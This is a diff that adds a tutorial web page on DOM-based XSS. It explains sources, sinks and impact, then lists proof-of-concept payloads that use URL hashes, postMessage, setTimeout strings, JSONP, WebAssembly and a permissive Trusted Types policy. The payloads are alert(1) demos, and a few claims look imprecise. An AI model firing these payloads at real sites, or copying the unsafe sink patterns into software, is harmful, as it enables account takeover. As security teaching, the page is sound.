@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM XSS</title>
+    <style>
+        :root{--bg:#0d0f17;--surface:#13151c;--text:#a0a8b8;--accent:#7aa2f7;--border:#24283b;--cyan:#7dcfff;--green:#9ece6a;--yellow:#e0af68;}
+        *{box-sizing:border-box;margin:0;padding:0;}
+        body{font-family:"Cascadia Code","Fira Mono",Consolas,monospace;background:var(--bg);color:var(--text);font-size:14px;line-height:1.6;min-height:100vh;}
+        .bar{background:var(--surface);border-bottom:1px solid var(--border);padding:8px 16px;display:flex;justify-content:space-between;position:sticky;top:0;z-index:10;}
+        .bar span{color:var(--accent);}
+        .wrap{max-width:960px;margin:auto;padding:2rem 1rem;}
+        .prompt{color:var(--green);}.cmd{color:var(--yellow);}
+        h1,h2,h3{color:var(--accent);margin-top:1.5rem;margin-bottom:.5rem;}
+        h1{font-size:1.4rem;}h2{font-size:1.2rem;}h3{font-size:1.05rem;}
+        code{background:var(--surface);border:1px solid var(--border);padding:2px 4px;border-radius:3px;color:var(--yellow);font-size:13px;}
+        pre{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:.75rem 1rem;overflow-x:auto;margin:.5rem 0;}
+        ul{margin-left:1.2rem;margin-top:.5rem;}li{margin-bottom:.25rem;}
+        footer{text-align:center;padding:2rem 0;color:var(--cyan);font-size:12px;}
+    </style>
+</head>
+<body>
+<div class="bar"><span>user@lab</span><span>~/xss/05-dom-xss</span></div>
+<main class="wrap">
+    <h1>DOM XSS</h1>
+
+    <h2>What it is</h2>
+    <p>Source and sink both live in browser; no HTTP round-trip. WAF never sees it.</p>
+
+    <h2>Why it happens</h2>
+    <p>JavaScript reads user data (URL, hash, postMessage) and feeds it straight into sinks like innerHTML, eval, document.write.</p>
+
+    <h2>Where you’ll meet it</h2>
+    <p>SPA routers, hash-based tabs, postMessage widgets, WebAssembly loaders, Trusted-Types default policies.</p>
+
+    <h2>Impact</h2>
+    <p>Bypasses server-side controls, CSP, WAF, cache; perfect for supply-chain back-door (see 2024 Polyfill.io again).</p>
+
+    <h2>Mini case-study</h2>
+    <p>2023 TikTok Lite DOM XSS via postMessage → stolen session tokens → $3 500 bounty.</p>
+
+    <h2>Payloads</h2>
+    <!-- Hash innerHTML -->
+    <pre><code>// URL hash directly inserted
+https://target.com/app#&lt;img src=x onerror=alert(1)&gt;</code></pre>
+
+    <!-- postMessage wildcard -->
+    <pre><code>// Any origin can send
+opener.postMessage({html:'&lt;script&gt;alert(1)&lt;/script&gt;'},'*')</code></pre>
+
+    <!-- setTimeout string concat -->
+    <pre><code>// User lands inside JS string literal
+setTimeout("animate('"+user+"')",0);  // user = "',alert(1),'"</code></pre>
+
+    <!-- JSONP name field -->
+    <pre><code>// Script tag inside JSON string still executes
+callback({"user":"John&lt;script&gt;alert(1)&lt;/script&gt;"})</code></pre>
+
+    <!-- WebAssembly import -->
+    <pre><code>// WASM exports JS eval
+fetch('data:application/wasm;base64,…')
+.then(r=>WebAssembly.instantiateStreaming(r))
+.then(o=>o.instance.exports._emscripten_run_script('alert(1)'))</code></pre>
+
+    <!-- Trusted-Types bypass -->
+    <pre><code>// Default policy allows anything
+TrustedTypes.createPolicy('default',{createHTML:s=>s});</code></pre>
+
+</main>
+<footer><span>EOF ── happy hacking :)</span></footer>
+</body>
+</html>
